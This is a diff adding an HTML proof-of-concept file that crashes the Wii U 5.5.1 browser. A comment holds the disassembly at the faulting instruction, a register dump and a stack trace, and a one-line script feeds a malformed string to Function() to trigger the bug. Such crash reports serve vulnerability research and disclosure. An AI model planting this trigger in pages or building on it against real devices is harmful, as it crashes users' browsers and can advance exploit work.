@@ -1,0 +1,45 @@
+<!--
+Tested on Wii U 5.5.1
+Source: https://pastebin.com/QWgVWbZR
+Result: Crash
+Exploitable? Uncertain, atm crash is due to invalid read
+
+Issue:
+.text:02055830                 stw       r28, 0x58+var_2C(r1)
+.text:02055834                 lwz       r5, -0x18(r29)
+.text:02055838                 lwz       r11, 0xC(r3)
+.text:0205583C                 lwz       r6, -0x14(r29)
+.text:02055840                 lwz       r25, 0xC(r11)
+.text:02055844                 stw       r5, 0x58+var_30(r1)
+.text:02055848                 stw       r6, 0x58+var_2C(r1)
+.text:0205584C                 lwz       r0, 0x44(r25)               #invalid access, crashes here
+
+Register dump:
+r0: 0E243B30 r1: 1AB78198 r2: 1050A200 r3: 1AF840E0 r4: 00000000
+r5: FFFFFFFB r6: 1AF4FFD0 r7: 00000002 r8: 05002000 r9: 00000000
+r10:00000000 r11:1AF84094 r12:1AF86100 r13:1050A200 r14:00000000
+r15:00000000 r16:00000000 r17:00000000 r18:00000000 r19:00000000
+r20:00000000 r21:1ACEDD50 r22:1ACC0000 r23:1ACCAFC0 r24:00000000
+r25:00000003 r26:1AB78308 r27:1AB78308 r28:00000000 r29:1AE80088
+r30:1ACD4630 r31:1ACD4630
+
+CR: 22000022 LR: 0E243B30 CTR:010426B8 XER:00000000
+EX0:40000000 EX1:00000047 SRR0:0E243B4C SRR1:0000F072
+
+Stack trace:
+00;04;30;660: 0x1ab78198:   0x1ab781f0    0x0e243b30 libwkc|JSValueUnprotect+0x3c514
+00;04;30;660: 0x1ab781f0:   0x1ab782f0    0x0e2470cc libwkc|JSValueUnprotect+0x3fab0
+00;04;30;660: 0x1ab782f0:   0x1ab78300    0x0e2473bc libwkc|JSValueUnprotect+0x3fda0
+00;04;30;660: 0x1ab78300:   0x1ab78330    0x0e247450 libwkc|JSValueUnprotect+0x3fe34
+00;04;30;660: 0x1ab78330:   0x1ab78360    0x0e24761c libwkc|JSValueUnprotect+0x40000
+00;04;30;660: 0x1ab78360:   0x1ab783a8    0x0e2221a8 libwkc|JSValueUnprotect+0x1ab8c
+00;04;30;660: 0x1ab783a8:   0x1ab78420    0x0e22ebf4 libwkc|JSValueUnprotect+0x275d8
+00;04;30;660: 0x1ab78420:   0x1ab78450    0x1ac93040 <unknown>+0x0
+00;04;30;660: 0x1ab78450:   0x1ab78ce0    0x0e21135c libwkc|JSValueUnprotect+0x9d40
+00;04;30;660: 0x1ab78ce0:   0x1ab78da8    0x0e237ee8 libwkc|JSValueUnprotect+0x308cc
+00;04;30;660: 0x1ab78da8:   0x1ab78e80    0x0e4e1f44 libwkc|__dt__Q2_3WKC13TextTrackListFv+0xd9c0
+00;04;30;661: 0x1ab78e80:   0x1ab78e98    0x0e4e26c8 libwkc|__dt__Q2_3WKC13TextTrackListFv+0xe144
+-->
+<script>
+  Function("}), x = this, (function() {");
+</script>
